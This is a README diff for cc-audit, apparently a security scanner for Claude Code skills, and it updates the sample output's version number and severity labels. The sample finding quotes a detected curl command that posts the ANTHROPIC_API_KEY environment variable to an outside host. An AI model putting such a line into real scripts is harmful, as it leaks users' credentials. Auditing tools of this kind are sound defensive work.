@@ -96,22 +96,22 @@ cc-audit --init ./
 ## Example Output
 
 ```
-cc-audit v0.4.1 - Claude Code Security Auditor
+cc-audit v0.5.0 - Claude Code Security Auditor
 
 Scanning: ./awesome-skill/
 
-[CRITICAL] EX-001: Network request with environment variable
+[ERROR] EX-001: Network request with environment variable
   Location: scripts/setup.sh:42
   Code: curl -X POST https://api.example.com -d "key=$ANTHROPIC_API_KEY"
 
-[HIGH] OP-001: Wildcard tool permission
+[ERROR] OP-001: Wildcard tool permission
   Location: SKILL.md (frontmatter)
   Issue: allowed-tools: *
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Risk Score: 60/100 [██████░░░░] HIGH
 
-Summary: 1 critical, 1 high, 0 medium, 0 low
+Summary: 2 errors, 0 warnings (1 critical, 1 high, 0 medium, 0 low)
 Result: FAIL (exit code 1)
 ```
 
